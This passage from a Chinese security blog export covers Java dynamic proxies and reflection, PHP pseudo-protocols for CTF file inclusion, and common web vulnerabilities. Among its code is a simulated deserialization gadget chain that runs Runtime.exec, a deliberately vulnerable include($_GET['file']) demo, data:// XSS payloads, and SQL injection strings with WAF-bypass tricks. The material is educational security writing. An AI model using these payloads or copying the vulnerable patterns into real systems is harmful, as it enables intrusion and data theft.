&#125;&#125; 运行代码，查看到readObject()中的不安全代码块中执行了命令： 参考深入理解JAVA I/O系列五：对象序列化 Java 序列化 java类中serialversionuid 作用 是什么?举个例子说明","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Java动态代理机制","date":"2019-02-01T15:01:14.000Z","path":"2019/02/01/Java动态代理机制/","text":"Java动态代理机制主要通过反射机制来实现的，下面讲解一下动态代理相关内容。 代理模式代理模式是Java中常用的设计模式，主要由公共接口、被代理类和代理类等三部分组成，代理类持有被代理类的实类，代为执行具体的类方法。其中代理类与被代理类有同样的接口。 代理类与被代理类之间通常会存在关联关系，一个代理类的对象与一个被代理类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用被代理类对象的方法来提供特定的服务。 代理模式结构图 使用代理模式的场景 (1)、设计模式中有一个设计原则是开闭原则，指修改关闭对扩展开放，当需要看非本人所写的代码时，通常很难直接修改代码，那么这时就可以通过代理对类进行增强。 (2)、在使用RPC框架时，框架本身并不能提前知道各个业务方要调用哪些接口的哪些方法 。那么这时就可通过动态代理的方式来建立一个中间人给客户端使用，也方便框架进行搭建逻辑，某种程度上也是客户端代码和框架松耦合的一种表现。 (3)、Spring的AOP机制就是采用动态代理的机制来实现切面编程。 静态代理与动态代理 根据加载被代理类的时机不同，将代理分为静态代理和动态代理。 如果在代码编译时就确定了被代理的类是哪一个，那么就可以直接使用静态代理；如果不能确定，那么可以使用类的动态加载机制，在代码运行期间加载被代理的类，这就是动态代理，比如RPC框架和Spring AOP机制。 静态代理静态代理：在代码编译时就确定了具体的被代理类。由程序员创建或特定工具自动生成源代码，也就是在编译时就已经将接口、被代理类、代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。 Demo示例 其中被代理类已经明确的在代理类代码中写出，在代码编译时就能确定出该被代理类，从而实现静态代理： 123456789101112131415161718192021222324252627public class test &#123; public static void consumer(ProxyInterface pi)&#123; pi.echo(); &#125; public static void main(String[] args) throws Exception&#123; consumer(new ProxyObject()); &#125;&#125;interface ProxyInterface &#123; void echo();&#125;class RealObject implements ProxyInterface &#123; public void echo()&#123; System.out.println(\"This is RealObject.\"); &#125;&#125;class ProxyObject implements ProxyInterface&#123; public void echo()&#123; System.out.println(\"AOP\"); new RealObject().echo(); System.out.println(\"Write Log\"); &#125;&#125; 可以看到，代理类ProxyObject在执行被代理类RealObject的方法前后都能够方便地添加新的功能如Spring的面向切面编程AOP，且是通过调用被代理类的方法来实现调用的而非代理类自己直接调用的： 动态代理基本概念在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。 注意，JDK提供的代理只能针对接口做代理。 下面来看下实现动态代理机制的Proxy类和InvocationHandler接口。 InvocationHandler接口每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，当代理类对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke ()方法来进行调用。 作为InvocationHandler接口唯一的方法，invoke ()方法定义如下： 1Object invoke(Object proxy, Method method, Object[] args) throws Throwable proxy参数：指代被代理类对象即真实对象； method参数：指代的是所要调用被代理类对象的某个方法的Method对象； args参数：指代的是调用被代理类对象某个方法时接受的参数； Proxy类Proxy这个类的作用就是用来动态创建一个代理对象类，它提供了许多的方法，其中用的最多的就是 newProxyInstance ()方法： 1public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException 这个方法的作用就是得到一个动态的代理类对象，其中接收三个参数： loader参数：一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理类对象进行加载； interfaces参数：一个Interface接口对象数组，说明将要给被代理类对象提供一组什么样的接口，如果提供了一组接口给被代理类对象，那么该对象就宣称实现了该接口(多态)，这样就能调用这组接口中的方法了； h参数：一个InvocationHandler对象，表示的是当这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上； 创建动态代理对象的具体步骤1、创建一个InvocationHandler对象 12//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu); 2、使用Proxy类的getProxyClass静态方法生成一个动态代理类stuProxyClass 1Class&lt;?&gt; stuProxyClass = Proxy.getProxyClass(Person.class.getClassLoader(), new Class&lt;?&gt;[] &#123;Person.class&#125;); 3、获得stuProxyClass 中一个带InvocationHandler参数的构造器constructor 1Constructor&lt;?&gt; constructor = PersonProxy.getConstructor(InvocationHandler.class); 4、通过构造器constructor来创建一个动态实例stuProxy 1Person stuProxy = (Person) cons.newInstance(stuHandler); 当然，上面四个步骤可以通过Proxy类的newProxyInstances()方法来简化： 1234//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu);//创建一个代理对象stuProxy，代理对象的每个执行方法都会替换执行Invocation中的invoke方法Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Person.class&#125;, stuHandler); Demo示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class test &#123; public static void main(String[] args) &#123; //创建一个被代理类的对象 Subject realSubject = new RealSubject(); //通过实现InvacationHandler接口，将被代理类对象传入handler InvocationHandler handler = new DynamicProxy(realSubject); /* * 通过Proxy的newProxyInstance方法来创建代理类对象，来看看其三个参数 * 第一个参数 handler.getClass().getClassLoader() ，我们这里使用handler这个类的ClassLoader对象来加载我们的代理对象 * 第二个参数realSubject.getClass().getInterfaces()，我们这里为代理对象提供的接口是真实对象所实行的接口，表示我要代理的是该真实对象，这样我就能调用这组接口中的方法了 * 第三个参数handler， 我们这里将这个代理对象关联到了上方的 InvocationHandler 这个对象上 */ Subject subject = (Subject)Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler); System.out.println(subject.getClass().getName()); subject.send(); subject.recv(); &#125;&#125;interface Subject &#123; public void send(); public void recv();&#125;class RealSubject implements Subject &#123; public void send()&#123; System.out.println(\"[*]Send\"); &#125; public void recv()&#123; System.out.println(\"[*]Recv\"); &#125;&#125;class DynamicProxy implements InvocationHandler &#123; //要代理的被代理类对象 private Object subject; //构造方法，给被代理类对象赋初始值 DynamicProxy(Object subject)&#123; this.subject = subject; &#125; public Object invoke(Object object, Method method, Object[] args) throws Throwable&#123; //在代理真实对象前可以添加一些功能操作 System.out.println(\"AOP\"); System.out.println(\"Method: \" + method); //当代理类对象调用被代理类对象的方法时，其会自动跳转到代理类对象关联的handler对象的invoke()方法来进行调用 method.invoke(subject, args); //在代理真实对象后也可以添加一些功能操作 System.out.println(\"Write Logs\"); return null; &#125;&#125; 再次提醒，JDK提供的代理只能是针对接口做代理，也就是说调用newProxyInstance()返创建代理类对象时回的必须要是一个接口。 观察输出内容： 第一行内容：”com.sun.proxy.\\$Proxy0”是由输出subject.getClass().getName())的结果，我们一般会以为返回的这个代理对象会是Subject类型的对象或者是InvocationHandler的对象，然并非，原因在newProxyInstance()方法的第二个参数上，该参数给代理类对象提供了一组接口，而该对象就会实现这组接口，这时可将这个对象强制类型转化为这组接口中的任意一个，因为这里的接口是Subject类型，所以就可以将其转化为Subject类型了。另外，通过 Proxy.newProxyInstance()创建的代理对象是在JVM运行时动态生成的一个对象，并非是InvocationHandler类型，也不是定义的那组接口的类型，而是在运行时动态生成的一个对象，并且命名方式都是以$开头、Proxy为中、最后为数字（表示对象的标号）的形式。 第二行至第五行内容（后面4行内容是类似的）：”AOP”和”Write Logs”为代理过程中新添加的输出功能；中间的”[*]Send”为代理类对象调用关联的handler中的invoke()方法来执行真实的被代理类的方法；”Method：”输出的是handler中invoke()方法method参数的值，这里可看到为”public abstract void Subject.send()”，说明该方法是来自真实的被代理类对象的接口方法，也就是说，并非是代理类对象直接调用目标方法，而是通过由其关联到的handler对象的invoke()方法中来调用，从而实现代理的方式调用。 同时因为在代码编译时并不知道被代理的类是哪个，因此实现了动态代理的方式。 原理分析查看Proxy类的newProxyInstance()函数的实现代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException &#123; Objects.requireNonNull(h); final Class&lt;?&gt;[] intfs = interfaces.clone(); final SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; checkProxyAccess(Reflection.getCallerClass(), loader, intfs); &#125; /* * Look up or generate the designated proxy class. */ Class&lt;?&gt; cl = getProxyClass0(loader, intfs); /* * Invoke its constructor with the designated invocation handler. */ try &#123; if (sm != null) &#123; checkNewProxyPermission(Reflection.getCallerClass(), cl); &#125; final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; if (!Modifier.isPublic(cl.getModifiers())) &#123; AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; cons.setAccessible(true); return null; &#125; &#125;); &#125; return cons.newInstance(new Object[]&#123;h&#125;); &#125; catch (IllegalAccessException|InstantiationException e) &#123; throw new InternalError(e.toString(), e); &#125; catch (InvocationTargetException e) &#123; Throwable t = e.getCause(); if (t instanceof RuntimeException) &#123; throw (RuntimeException) t; &#125; else &#123; throw new InternalError(t.toString(), t); &#125; &#125; catch (NoSuchMethodException e) &#123; throw new InternalError(e.toString(), e); &#125; &#125; 可以发现只是封装了创建动态代理类的步骤。 重点关注”Class&lt;?&gt; cl = getProxyClass0(loader, intfs);”，其用于产生代理类，后面代码中的构造器也是通过这里产生的类来获得，因此可看出这个类的产生就是整个动态代理的关键。 JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。 小结可以将InvocationHandler接口类看做一个中介类，中介类持有一个被代理对象即真实对象，在invoke()方法中调用了被代理对象相应的方法。通过聚合方式持有被代理对象的引用，把外部对invoke的调用最终都转为对被代理对象的调用。 代理类调用自己方法时，通过自身持有的中介类对象来调用中介类对象的invoke方法，从而达到代理执行被代理对象的方法。也就是说，动态代理通过中介类实现了具体的代理功能。 参考java动态代理实现与原理详细分析 java的动态代理机制详解 Java动态代理与反射详解","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Java反射机制","date":"2019-02-01T12:57:24.000Z","path":"2019/02/01/Java反射机制/","text":"基本概念反射机制定义：Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 通俗点讲，通过反射，该类对我们来说是完全透明的，想要获取任何东西都可以。 要使用反射机制，就必须要先获取到该类的字节码文件对象(.class)，通过字节码文件对象，就能够通过该类中的方法获取到我们想要的所有信息(方法，属性，类名，父类名，实现的所有接口等等)，每一个类对应着一个字节码文件也就对应着一个Class类型的对象，也就是字节码文件对象。 反射机制相关类库在Java中，Class类和java.lang.reflect类库一起构成了对反射机制的支持。其中最常使用到的类是Constructor，Field，Method，而这三个类都继承了一个接口java.lang.reflect.Member。下面列举介绍一下java.lang.reflect类库中的类： AccessibleObject：Field，Method，和Constructor对象的基类。提供了将反射的对象标记为在使用时取消默认Java语言访问控制检查的能力。 Array：提供了动态创建和访问Java数组的方法。 Constructor：提供关于类的单个构造方法的信息以及对它的访问权限。 Field： 提供有关类或接口的单个字段的信息，以及对它的动态访问权限。反射的字段可能是一个类（静态）字段或实例字段。 Method： 提供关于类或接口上单独某个方法（以及如何访问该方法）的信息。所反映的方法可能是类方法或实例方法（包括抽象方法）。 Modifier： 类提供了 static 方法和常量，对类和成员访问修饰符进行解码。修饰符集被表示为整数，用不同的位位置 (bit position) 表示不同的修饰符。该类的字段均是int类型的变量。 Proxy： 提供用于创建动态代理类和实例的静态方法，它还是由这些方法创建的所有动态代理类的超类。 ReflectPermission：反射操作的 Permission 类。ReflectPermission 是一种指定权限，没有动作。当前定义的唯一名称是 suppressAccessChecks，它允许取消由反射对象在其使用点上执行的标准 Java 语言访问检查 - 对于 public、default（包）访问、protected、private 成员。 当要使用反射机制去探查一个类的内部时，还可以调用getFields()，getMethods()和getConstructors()等很便利的方法。对于反射机制，和RTTI（Run-Time Type Information，运行时类型信息）的区别就在于，RTTI是在编译时打开和检查.class文件，而反射机制是在运行时打开和检查.class文件。 获取类名称通过反射机制获取类名称有三种方法： 1、Class clz = Class.forName(“com.test.User”); 2、Class clz = com.test.User.class; 3、User u = new User(); Class clz = u.getClass(); Demo示例： 123456789101112131415161718192021public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz1 = Class.forName(\"java.lang.Runtime\"); System.out.println(\"方法一：\"); System.out.println(clz1.getName()); &#125; catch (ClassNotFoundException e) &#123; System.out.println(\"forName出错\"); &#125; Class clz2 = java.lang.ProcessBuilder.class; System.out.println(\"方法二：\"); System.out.println(clz2.getName()); java.lang.String s = \"\"; Class clz3 = s.getClass(); System.out.println(\"方法三：\"); System.out.println(clz3.getName()); &#125;&#125; 可从运行结果中看到分别获取了不同类名称： 创建对象通过Class创建对象： Class clz = Class.forName(“com.test.User”); User u = (User)clz.newInstane();//调用无参构造函数 Demo示例： Uset.class定义User类，包含用户名和年龄： 12345678910111213141516171819202122232425262728public class User &#123; private String name; private int age; @Override public String toString() &#123; return \"User&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125;&#125; test.class中调用newInstane()创建对象： 123456789101112131415161718public class test &#123; public static void main(String[] args) &#123; Class clz = User.class; User user = null; try &#123; user = (User)clz.newInstance(); &#125; catch (InstantiationException e)&#123; e.printStackTrace(); &#125; catch (IllegalAccessException e)&#123; e.printStackTrace(); &#125; user.setName(\"Mi1k7ea\"); user.setAge(6); System.out.println(user); &#125;&#125; 从结果可看到创建了新的User类对象并成功赋值： 获取类对象属性这里的属性指的是类定义的组成元素，如修饰符、方法名、成员变量等。 获取所有的属性： Class clz = Class.forName(“com.test.User”); Field [] fields = clz.getDeclaredFields(); 获取特定属性： Class clz = Class.forName(“com.test.User”); Field [] fields = clz.getDeclaredField(“xxx”);//xxx为指定属性名 Demo示例： 1234567891011121314151617181920212223242526272829import java.lang.reflect.Field;public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz = Class.forName(\"User\"); User user = (User)clz.newInstance(); Field[] fields = clz.getDeclaredFields(); System.out.println(\"User类所有的属性：\"); for (Field f : fields) &#123; System.out.println(f); &#125; Field field = clz.getDeclaredField(\"name\"); field.setAccessible(true); field.set(user, \"Mi1k7ea\"); System.out.println(\"\\n修改的User类对象的name值为：\"); System.out.println(field.get(user)); System.out.println(\"修改属性后的User类对象：\"); System.out.println(user); &#125; catch (ClassNotFoundException e) &#123; System.out.println(\"forName出错\"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 可从结果看到调用获取了getDeclaredFields()所有Runtime类的属性，包括修饰符、方法名、成员变量等，同时也调用getDeclaredField()获取了指定的属性： 应用示例1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象原理：集合中的泛型只在编译器有效，而到了运行期时泛型则会失效。 1234567891011121314151617import java.lang.reflect.Method;import java.util.ArrayList;import java.util.List;public class test &#123; public static void main(String[] args) throws Exception&#123; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(2);// list.add(\"Mi1k7ea\");//在编译器中泛型生效，插入字符串对象会报错 Class clz = list.getClass(); Method method = clz.getMethod(\"add\", Object.class); method.invoke(list, \"Mi1k7ea\"); System.out.println(list); &#125;&#125; 可以看到成功将String类型对象放入泛型为int型的数组中： 2、利用反射，简化编写Servlet的个数利用反射机制，在为程序添加新功能时可以无需逐个对应编写新的Servlet，提高开发效率和代码简洁性。主要有如下两个方式优化。 （1）、通过编写利用反射机制获取指定属性值的Servlet的方式 每次从页面传过来一个参数，method=”xxx”; 然后编写一个Servlet，获得其参数method的值，进行判断，如果是add，则调用add方法，如果是delete，则调用delete方法，这样就可以写在一个servlet中实现所有的功能了。 （2）、通过Servlet的生命周期即service()实现反射机制来实现 编写一个通用的BaseServlet，继承于HttpServlet： 编写具体实现的方法Servlet类MyServlet001，继承于BaseServlet： 由Servlet的生命周期可知，在访问该Servlet时会调用service()方法，然而MyServlet001类中并无service()，因此会返回到父类BaseServlet中找到该service()方法，再获取参数从而知道需要调用的方法，因为方法的编写都在子类中，所以通过反射，获取到子类中对应的方法并运行，其中需要注意的是this这个参数在BaseServlet中的用法。 3、利用反射，构造链式结构的反序列化漏洞利用payload在经典的Apache Commons Collections反序列化漏洞中，其payload的构造正是利用了反射机制来实现链式结构，将要执行的恶意代码构造成一条反射链，再通过包含自定义readObject()方法的类来触发执行。 这里简单模拟一下该反序列化漏洞场景，代码示例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import java.io.*;public class ReflectionPlay implements Serializable &#123; public static void main(String[] args) throws Exception &#123; ReflectionPlay rp = new ReflectionPlay(); rp.deserialize(rp.serialize(rp.getObject())); &#125; //构造链式结构的ReflectionChains类对象并复制到ReadObject类对象中，返回该恶意对象 public Object getObject() &#123; String command = \"calc.exe\"; Object firstObject = Runtime.class; ReflectionObject[] reflectionChains = &#123; //调用Runtime.class的getMethod方法，寻找getRuntime方法，得到一个Method对象(getRuntime方法) //等同于Runtime.class.getMethod(\"getRuntime\",new Class[]&#123;String.class,Class[].class&#125;) new ReflectionObject(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), //调用Method的invoker方法可以得到一个Runtime对象，等同于method.invoke(null)，静态方法不用传入对象 new ReflectionObject(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), //调用RunTime对象的exec方法，并将command作为参数执行命令 new ReflectionObject(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;command&#125;) &#125;; return new ReadObject(new ReflectionChains(firstObject, reflectionChains)); &#125; //序列化对象到byte数组 public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; //从byte数组中反序列化对象 public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125; //定义一个有漏洞的类，主要提供的功能是根据自己属性中的值来进行反射调用 class ReflectionObject implements Serializable&#123; private String methodName; private Class[] paramTypes; private Object[] args; public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) &#123; this.methodName = methodName; this.paramTypes = paramTypes; this.args = args; &#125; //根据methodName、paramTypes来寻找对象的方法，利用args作为参数进行调用 public Object transform(Object input) throws Exception &#123; Class inputClass = input.getClass(); return inputClass.getMethod(methodName, paramTypes).invoke(input, args); &#125; &#125; //定义一个反射链的类 class ReflectionChains implements Serializable&#123; private Object firstObject; private ReflectionObject[] reflectionObjects; public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) &#123; this.firstObject = firstObject; this.reflectionObjects = reflectionObjects; &#125; //遍历ReflectionObject类对象数组并调用其transform()方法 public Object execute() throws Exception &#123; Object concurrentObject = firstObject; for (ReflectionObject reflectionObject : reflectionObjects) &#123; concurrentObject = reflectionObject.transform(concurrentObject); &#125; return concurrentObject; &#125; &#125; //定义一个用于序列化与反序列化的类,拥有一个属性和一个重写了的readObject()方法，并且在readObject()方法中执行了该属性的一个方法 //当反序列化该类对象时会执行自定义的readObject()方法 class ReadObject implements Serializable &#123; private ReflectionChains reflectionChains; public ReadObject(ReflectionChains reflectionChains) &#123; this.reflectionChains = reflectionChains; &#125; //自定义readObject()，当反序列化的时候，这个代码会被调用，且被调用的时候其属性都是空 private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException &#123; try &#123; //用来模拟当readObject()的时候，对自身的属性进行了一些额外的操作，以符合反序列化漏洞特征 reflectionChains= (ReflectionChains) stream.readFields().get(\"reflectionChains\",null); reflectionChains.execute(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 运行后弹出计算器，即利用了反射机制实现系统命令执行： 参考Java中反射机制详解 Java反射机制Reflection","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"PHP伪协议","date":"2019-01-31T13:24:25.000Z","path":"2019/01/31/PHP伪协议/","text":"基本概念PHP伪协议在CTF中经常使用到，这里写个简单的Demo小结一下，主要对file://、php://filter、php://input、data://、zip://、compress.bzip2://、compress.zlib://、phar://等协议进行简单的Demo介绍分析。 简单说一下，file://用于访问本地文件系统读取本地文件；php://访问各个输入/输出流（I/O streams），其中php://filter用于读取文件内容，php://input可以访问请求的原始数据的只读流、同时可将post请求中的数据作为PHP代码执行；zip://，bzip2://，zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名；data://即写入数据；phar://即PHP归档。 简单文件包含Demo代码demo.php 1234567&lt;?php echo '&lt;h3&gt;Hi, just a test for php pseudo protocol. :)&lt;/h3&gt;'; echo '&lt;p&gt;u can input a param called \"file\" by GET method.&lt;/p&gt;'; if(isset($_GET[\"file\"]))&#123; @include($_GET[\"file\"]); &#125;?&gt; 正常访问，提示可以通过GET传入一个file参数包含文件： file://协议file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件且不受allow_url_fopen与allow_url_include的影响。 注意：该协议的路径只能输入绝对路径，输入相对路径是不生效的。 先输入一个文本文件，可以读到该文件内容，比如CTF经常遇到的flag： 输入php或JS文件，file://协议会执行该PHP文件里的代码而不是显示该内容，因而该协议不适用于获取文件内容源代码（而常用php://filter伪协议）： php://协议php://访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 不需要开启allow_url_fopen，仅php://input、php://stdin、 php://memory和php://temp需要开启allow_url_include。 php://filter协议php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。在CTF中主要用于读取文件内容。不需要开启allow_url_fopen和allow_url_include。 查看之前的test.js文件与PHP文件： php://input协议php://input可以访问请求的原始数据的只读流，在CTF中多用于执行php代码。 不需要开启allow_url_fopen和allow_url_include。 data://协议data://即数据，在CTF中主要用于写入代码并包含该代码到当前页面中。 必须同时开启allow_url_fopen和allow_url_include。 使用形式如下： 1234data:text/plain;base64, &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;data://text/plain;base64, &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= zip://、bzip2://、zlib://协议zip://、bzip2://、zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 不需要开启allow_url_fopen和allow_url_include。 zip://协议zip://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 文件路径必须为绝对路径。 上传一个包含PHP代码文件的zip包，只要zip://访问该协议即触发文件包含漏洞、将任意文本文件中的内容当作PHP代码执行： 当然可以修改上传的zip文件后缀名为其他如图片后缀，根据特定情况可绕过一些上传文件类型的限制： zlib://协议zlib://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： compress.zlib://file 文件无绝对路径限制。 bzip2://协议bzip2://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： compress.bzip2://file 文件无绝对路径限制。 可是这里怎么测试都不成功，通过phpinfo查看bzip2://是enable且文件类型和文件路径都进行尝试，PHP版本也换了几个，还是无法显示phpinfo信息，哪位知道原因的大佬请指点一下 : ) phar://协议phar://即PHP归档，常用于解析phar文件内容，最近的CTF中多用于phar反序列化漏洞利用。反序列化漏洞具体的利用可参考phar反序列化漏洞。","tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"常见Web漏洞类型总结","date":"2019-01-30T14:47:15.000Z","path":"2019/01/30/常见Web漏洞类型/","text":"这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、基本概念漏洞定义 SQL注入漏洞作为OWASP TOP10中重要的一部分，可见其安全性的危害有多大。简单地说，SQL注入就是通过构建特殊的具有SQL语法的语句，绕到数据库中进而执行相应的操作的漏洞。攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。 成因 针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的： 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中 攻击方式 SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为基于报错的注入、基于布尔的注入和盲注。 ​ 基于报错的注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，如注入各种符号以及组合： ‘ “ ( % ​ 基于布尔的注入：攻击者可以直接在当前界面内容中获取想要获得的内容，如注入：1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0，当返回的结果不同时即有漏洞 盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容 ​ 判断盲注的常见用法： 121’ and 1=1 #1’ and 1=2 # ​ 判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。 ​ 基于布尔的注入代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 --+ ​ 基于报错的注入代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+ ​ 盲注代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select substr(email_id,1,1) from emails where id=3) &gt; 'a' --+ 几个常用的函数 ​ user()返回当前数据库连接使用的用户； ​ database()返回当前数据库连接使用的数据库； ​ version()返回当前数据库的版本； ​ concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例： 1concat_ws(char(32,58,32),user(),database(),version()) ​ 其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。 几个常用的全局函数 ​ @@datadir @@hostname @@VERSION @@version_compile_os 危害 攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。 二、绕过WAF的方法1、大小写绕过 ​ 如：?id=1’ uNiOn SElecT * FrOm users # 2、简单编码绕过 ​ 如URL编码、双重URL编码、Hex编码、Unicode编码等。 ​ ?id=1%252f%252a*/UNION%252f%252a /SELECT ​ id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4… ​ ?id=10%D6‘%20AND%201=2%23 ​ SELECT ‘Ä’=’A’; #1 3、注释绕过 ​ 如?id=1 uni//on sele//ct 1,2,3 # 4、分隔重写绕过 ​ 适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。 5、HTTP参数污染(HPP)： ​ 如?id=1 union select 1,2,3 from users where id=1 # ​ 这时可以改为 ?id=1 union select 1&amp;id=2,3 from users where id=1 # ​ 次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ； ​ 这个例子也同理：?id=1//union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users # ​ 如果服务器代码为： select from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit /from users # 可以看到，这种方式比较适合白盒测试。 6、使用逻辑运算符 or /and 绕过 ​ 如?id=1 or 0x50=0x50 ​ ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写， ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。 7、比较操作符替换 ​ 比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。 8、同功能函数替换 ​ substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的； ​ ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换； ​ 